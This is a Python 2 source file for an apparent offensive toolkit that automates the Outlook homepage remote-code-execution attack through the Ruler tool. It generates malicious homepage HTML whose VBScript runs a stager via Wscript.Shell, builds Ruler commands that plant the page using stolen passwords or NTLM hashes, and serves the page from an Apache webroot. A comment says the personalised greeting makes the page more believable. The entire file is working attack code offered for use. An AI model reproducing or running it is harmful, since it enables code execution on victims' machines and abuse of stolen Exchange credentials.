import string
import random
import re
import threading
import subprocess
import requests
import sys
from datetime import date
from subprocess import check_output

#this class is solely used to generate payloads and manage the starting of services etc
class Attack_Chain(object):
    def __init__(self, name, target_name, email , homepage, username, password, autodiscover_url ,active=True,hash_val=''):
        self.name = name
        self.username = username
        self.hash = hash_val
        self.password = password
        self.active = active
        self.homepage = homepage
        self.homepage_external = ""
        self.email = email
        self.target_name = target_name
        self.date = date.today()
        self.Launcher = ""#powershell cradle for empire
        self.autodiscover = autodiscover_url
        #just seems like having the location in the object  from getgo works just check each file after each step
        self.hosts_location_loot = "/root/rulerpivot/"  +"_"+username+"_"+str(self.date)+ "/loot.json"



 
    def create_user_homepage(self,hmpg_name,hmpg_content):
        #try to write to dir to serve files this will be developed later
        try:
           file_handle = open(hmpg_name, "w") 
           file_handle.write(hmpg_content) 
           file_handle.close() 
           
        except:
            pass
  

    def ruler_execute(self,ruler_cmd):
        cmd = ruler_cmd
        #aware of cmd injection input is trusted its a poc could care less tbh
        ## run it ##
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE)
 
        ## But do not wait till netstat finish, start displaying output immediately ##
        while True:
            out = p.stderr.read(1)
            if out == '' and p.poll() != None:
               break
            if out != '':
               sys.stdout.write(out)
               sys.stdout.flush()

    def gen_homepage_path(self):
        print('In Gen Homepage Vector')
        #add a bit of entropy not very secure probably
        try:
           web_root = "/var/www/html/"
           rand_homepage = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
           path_to_homepage_dynamic = web_root + rand_homepage +".html"
           path_to_homepage_dynamic_ext = "/"+rand_homepage +".html"
           #start apache and copy user shell to webroot and return path to shell on server check it and return if true
           self.homepage += path_to_homepage_dynamic_ext
           self.homepage_external += path_to_homepage_dynamic_ext
           return self.homepage,self.homepage_external
        except:
           pass


    def determine_ntlm_basic(self):
        password_hash = self.hash
        if len(password_hash) == 32:
           #validate hash to be a 32 char 0-9, a-f/A-F string
           valid = all(c in string.hexdigits for c in password_hash)
           if valid:
              return True
           else:
              return False
        else:
           pass
    

     #https://gist.githubusercontent.com/staaldraad/c7b857e9bd6fd332f6f1bd01a2160266/raw/16fb7bb5aac443f4541dd0557062445d128b9813/outlookHomepageRCE.html
    
    def gen_page_normal(self,stager_url):
        ruler_command = ['./ruler','--email',self.email,'--password',self.password,'homepage', 'add','--url', self.homepage]
        print(ruler_command)
        mal_homepage = """
                       <html>
                       <head>
                       <meta http-equiv="Content-Language" content="en-us">
                       <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
                       <title>Outlook</title>
                       <script id=clientEventHandlersVBS language=vbscript>
                       <!--
                       Sub window_onload()
                           Set Application = ViewCtl1.OutlookApplication
                           Set cmd = Application.CreateObject("Wscript.Shell")
                           cmd.Run(""" + stager_url + """)
                       End Sub
                       -->

                       </script>
                       </head>

                       <body>
                       <h1> hello """+self.username+"""</h1>
                       <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
                       </body>
                       </html>
                       """
        print mal_homepage
        return mal_homepage,ruler_command




    def gen_page_pth(self,stager_url):
        ruler_command = ['./ruler','--email',self.email,'homepage', 'add','--url', self.homepage,'--url',self.autodiscover,'--username',self.username,'--hash',self.hash]
   
        mal_homepage = """
                       <html>
                       <head>
                       <meta http-equiv="Content-Language" content="en-us">
                       <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
                       <title>Outlook</title>
                       <script id=clientEventHandlersVBS language=vbscript>
                       <!--
                       Sub window_onload()
                           Set Application = ViewCtl1.OutlookApplication
                           Set cmd = Application.CreateObject("Wscript.Shell")
                           cmd.Run(""" + stager_url + """)
                       End Sub
                       -->

                       </script>
                       </head>

                       <body>
                       <h1> hello """+username+"""</h1>
                       <object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"></object>
                       </body>
                       </html>
                       """
                       #add custom username greeting per user above to make more belivable
                       #this is used by saving this file to apache and storing as class var to access it 
        return mal_homepage,ruler_command










